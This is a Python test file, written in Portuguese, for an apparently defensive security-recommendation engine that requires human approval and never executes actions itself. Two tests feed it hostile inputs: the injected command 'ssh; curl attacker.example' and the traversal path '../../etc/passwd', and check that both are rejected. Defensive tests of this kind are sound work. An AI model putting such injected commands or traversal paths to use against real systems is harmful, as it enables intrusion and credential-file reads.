"""Testes unitários do motor de defesa autônoma governada."""
from __future__ import annotations

import json
import math
import unittest

import nixal_defesa_autonoma as defesa


class RelogioFalso:
    def __init__(self) -> None:
        self.valor = 1000.0

    def __call__(self) -> float:
        return self.valor

    def avancar(self, segundos: float) -> None:
        self.valor += segundos


class TesteDefesaAutonoma(unittest.TestCase):
    def setUp(self) -> None:
        self.relogio = RelogioFalso()
        self.motor = defesa.DefesaAutonoma(relogio=self.relogio)

    def evento(self, tipo: str, **kwargs):
        fonte = defesa.FONTES_PADRAO_EVENTO.get(tipo)
        if fonte is not None:
            kwargs.setdefault("fonte_sinal", fonte)
        return {"tipo": tipo, **kwargs}

    def avaliar_falha(self, ip: str = "203.0.113.10"):
        return self.motor.avaliar(self.evento("falha_autenticacao", origem_ip=ip))

    @staticmethod
    def tipos(decisao):
        return [item["tipo"] for item in decisao["recomendacoes"]]

    def test_evento_malformado_e_rejeitado_sem_efeito(self):
        decisao = self.motor.avaliar("não é evento")
        self.assertEqual(decisao["estado"], "evento_rejeitado")
        self.assertEqual(decisao["recomendacoes"], [])
        self.assertFalse(decisao["efeito_executado"])

    def test_tipo_nao_suportado_e_rejeitado(self):
        for valor in ("ataque_qualquer", ["lista"], {"tipo": "objeto"}):
            with self.subTest(tipo=valor):
                decisao = self.motor.avaliar({"tipo": valor})
                self.assertEqual(decisao["motivos"], ["tipo_evento_nao_suportado"])
                self.assertEqual(decisao["recomendacoes"], [])

    def test_fonte_de_sinal_incompativel_e_rejeitada(self):
        decisao = self.motor.avaliar({
            "tipo": "falha_autenticacao",
            "fonte_sinal": "credential-monitor",
            "origem_ip": "203.0.113.10",
        })
        self.assertEqual(decisao["estado"], "evento_rejeitado")
        self.assertEqual(decisao["motivos"], ["fonte_sinal_nao_autorizada"])
        self.assertEqual(decisao["recomendacoes"], [])

    def test_evento_critico_sem_evidencia_e_rejeitado(self):
        decisao = self.motor.avaliar(self.evento(
            "violacao_integridade", servico="nyxal-api",
        ))
        self.assertEqual(decisao["estado"], "evento_rejeitado")
        self.assertEqual(decisao["motivos"], ["evidencia_id_obrigatorio"])
        self.assertEqual(decisao["recomendacoes"], [])

    def test_falhas_isoladas_nao_bloqueiam_origem(self):
        primeira = self.avaliar_falha()
        segunda = self.avaliar_falha()
        self.assertEqual(primeira["severidade"], "baixa")
        self.assertEqual(segunda["severidade"], "baixa")
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(primeira))
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(segunda))

    def test_terceira_falha_recomenda_rate_limit(self):
        self.avaliar_falha()
        self.avaliar_falha()
        decisao = self.avaliar_falha()
        self.assertIn("limitar_taxa_origem", self.tipos(decisao))
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertEqual(decisao["severidade"], "media")

    def test_oito_falhas_recomendam_bloqueio_curto_e_reversivel(self):
        for _ in range(7):
            self.avaliar_falha()
        decisao = self.avaliar_falha()
        bloqueios = [
            item for item in decisao["recomendacoes"]
            if item["tipo"] == "bloqueio_temporario_origem"
        ]
        self.assertEqual(len(bloqueios), 1)
        self.assertEqual(bloqueios[0]["duracao_segundos"], 300)
        self.assertFalse(bloqueios[0]["efeito_executado"])
        self.assertEqual(decisao["severidade"], "alta")

    def test_janela_deslizante_expira_falhas_antigas(self):
        for _ in range(2):
            self.avaliar_falha()
        self.relogio.avancar(61)
        decisao = self.avaliar_falha()
        self.assertNotIn("limitar_taxa_origem", self.tipos(decisao))
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))

    def test_loopback_nunca_recebe_bloqueio_automatico(self):
        decisao = None
        for _ in range(10):
            decisao = self.avaliar_falha("127.0.0.1")
        self.assertIsNotNone(decisao)
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertIn(
            "origem_loopback_nao_bloqueada_automaticamente",
            decisao["motivos"],
        )

    def test_origem_suspeita_recomenda_limitacao_nao_bloqueio(self):
        decisao = self.motor.avaliar(self.evento(
            "origem_suspeita", origem_ip="198.51.100.17", confianca=0.8,
            evidencia_id="evt-123",
        ))
        self.assertIn("limitar_taxa_origem", self.tipos(decisao))
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertEqual(decisao["evento"]["evidencia_id"], "evt-123")

    def test_exploracao_com_confianca_alta_recomenda_bloqueio_temporario(self):
        decisao = self.motor.avaliar(self.evento(
            "tentativa_exploracao", origem_ip="198.51.100.23", confianca=0.92,
            evidencia_id="ids-exploit-1",
        ))
        self.assertIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertNotIn("encaminhar_para_enganacao_isolada", self.tipos(decisao))

    def test_enganacao_so_e_recomendada_com_confianca_muito_alta_e_aprovacao(self):
        decisao = self.motor.avaliar(self.evento(
            "tentativa_exploracao", origem_ip="198.51.100.23", confianca=0.99,
            evidencia_id="ids-exploit-2",
        ))
        honeypots = [
            item for item in decisao["recomendacoes"]
            if item["tipo"] == "encaminhar_para_enganacao_isolada"
        ]
        self.assertEqual(len(honeypots), 1)
        self.assertEqual(honeypots[0]["escopo"], "decoy-service-interno")
        self.assertTrue(honeypots[0]["exige_aprovacao_humana"])
        self.assertFalse(honeypots[0]["executor_autorizado"])
        self.assertFalse(honeypots[0]["efeito_executado"])

    def test_exploracao_com_baixa_confianca_nao_bloqueia_nem_usa_decoy(self):
        decisao = self.motor.avaliar(self.evento(
            "tentativa_exploracao", origem_ip="198.51.100.23", confianca=0.4,
            evidencia_id="ids-exploit-low",
        ))
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertNotIn("encaminhar_para_enganacao_isolada", self.tipos(decisao))

    def test_violacao_integridade_requer_aprovacao_para_isolar(self):
        decisao = self.motor.avaliar(self.evento(
            "violacao_integridade",
            servico="nyxal-api",
            evidencia_id="integridade-17",
        ))
        isolamentos = [
            item for item in decisao["recomendacoes"]
            if item["tipo"] == "isolar_servico"
        ]
        self.assertEqual(len(isolamentos), 1)
        self.assertEqual(isolamentos[0]["escopo"], "nyxal-api")
        self.assertTrue(isolamentos[0]["exige_aprovacao_humana"])
        self.assertEqual(decisao["severidade"], "critica")

    def test_servico_fora_da_allowlist_e_rejeitado(self):
        decisao = self.motor.avaliar(self.evento(
            "violacao_integridade", servico="ssh; curl attacker.example",
        ))
        self.assertEqual(decisao["estado"], "evento_rejeitado")
        self.assertEqual(decisao["motivos"], ["servico_fora_da_allowlist"])
        self.assertEqual(decisao["recomendacoes"], [])

    def test_credencial_comprometida_usa_id_sem_expor_segredo(self):
        decisao = self.motor.avaliar(self.evento(
            "credencial_comprometida",
            servico="gateway-atuacao",
            credencial_id="credencial-prod-4",
            evidencia_id="credential-incident-8",
            segredo="NAO_INCLUIR_ESTE_SEGREDO",
        ))
        revogacoes = [
            item for item in decisao["recomendacoes"]
            if item["tipo"] == "revogar_credencial"
        ]
        self.assertEqual(len(revogacoes), 1)
        self.assertEqual(revogacoes[0]["escopo"], "credencial-prod-4")
        self.assertTrue(revogacoes[0]["exige_aprovacao_humana"])
        self.assertNotIn("NAO_INCLUIR_ESTE_SEGREDO", json.dumps(decisao))

    def test_identificador_de_artefato_nao_aceita_caminho(self):
        decisao = self.motor.avaliar(self.evento(
            "malware_detectado", artefato_id="../../etc/passwd",
        ))
        self.assertEqual(decisao["estado"], "evento_rejeitado")
        self.assertEqual(decisao["recomendacoes"], [])

    def test_quarentena_de_artefato_exige_aprovacao(self):
        decisao = self.motor.avaliar(self.evento(
            "malware_detectado", artefato_id="sha256:artefato-abc",
            evidencia_id="malware-incident-10",
        ))
        quarantenas = [
            item for item in decisao["recomendacoes"]
            if item["tipo"] == "quarentenar_artefato"
        ]
        self.assertEqual(len(quarantenas), 1)
        self.assertTrue(quarantenas[0]["exige_aprovacao_humana"])
        self.assertFalse(quarantenas[0]["efeito_executado"])

    def test_recuperacao_nao_limpa_evidencias_automaticamente(self):
        decisao = self.motor.avaliar(self.evento(
            "recuperacao_verificada", evidencia_id="incidente-31",
        ))
        self.assertEqual(
            self.tipos(decisao), ["solicitar_revisao_de_incidente"]
        )
        self.assertTrue(decisao["recomendacoes"][0]["exige_aprovacao_humana"])

    def test_confianca_invalida_e_rejeitada(self):
        for valor in (True, -0.1, 1.1, math.nan, math.inf, "alta"):
            with self.subTest(confianca=valor):
                decisao = self.motor.avaliar(self.evento(
                    "origem_suspeita",
                    origem_ip="198.51.100.5",
                    confianca=valor,
                ))
                self.assertEqual(decisao["estado"], "evento_rejeitado")
                self.assertEqual(decisao["recomendacoes"], [])

    def test_toda_decisao_explicitamente_declara_que_nao_executou_acao(self):
        for evento in (
            self.evento("falha_autenticacao", origem_ip="203.0.113.22"),
            self.evento("violacao_integridade", servico="nyxal-api", evidencia_id="integrity-22"),
            self.evento("servico_indisponivel", servico="inferencia-local", evidencia_id="health-22"),
        ):
            decisao = self.motor.avaliar(evento)
            self.assertFalse(decisao["efeito_executado"])
            for recomendacao in decisao["recomendacoes"]:
                self.assertFalse(recomendacao["efeito_executado"])
                self.assertFalse(recomendacao["executor_autorizado"])

    def test_estado_de_origens_tem_limite_de_memoria(self):
        import ipaddress

        for numero in range(defesa.MAX_TRACKED_ORIGINS + 1):
            origem = str(ipaddress.ip_address(numero + 1))
            self.motor.avaliar(self.evento(
                "falha_autenticacao", origem_ip=origem,
            ))
        self.assertLessEqual(
            len(self.motor._falhas), defesa.MAX_TRACKED_ORIGINS,
        )

    def test_historico_de_falhas_por_origem_tem_limite(self):
        for _ in range(defesa.MAX_FAILURES_PER_ORIGIN * 4):
            decisao = self.avaliar_falha()
        self.assertLessEqual(
            len(self.motor._falhas["203.0.113.10"]),
            defesa.MAX_FAILURES_PER_ORIGIN,
        )
        self.assertIn("bloqueio_temporario_origem", self.tipos(decisao))

    def test_ipv4_mapped_loopback_nao_pode_ser_classificado_como_remoto(self):
        decisao = self.motor.avaliar(self.evento(
            "tentativa_exploracao",
            origem_ip="::ffff:127.0.0.1",
            confianca=0.99,
            evidencia_id="ids-local-1",
        ))
        self.assertEqual(decisao["estado"], "avaliado")
        self.assertEqual(decisao["evento"]["origem_ip"], "127.0.0.1")
        self.assertNotIn("bloqueio_temporario_origem", self.tipos(decisao))
        self.assertNotIn("encaminhar_para_enganacao_isolada", self.tipos(decisao))

    def test_construtor_rejeita_limites_inconsistentes(self):
        with self.assertRaises(ValueError):
            defesa.DefesaAutonoma(janela_segundos=0)
        with self.assertRaises(ValueError):
            defesa.DefesaAutonoma(limiar_rate_limit=4, limiar_bloqueio=4)
        with self.assertRaises(ValueError):
            defesa.DefesaAutonoma(duracao_bloqueio_segundos=0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
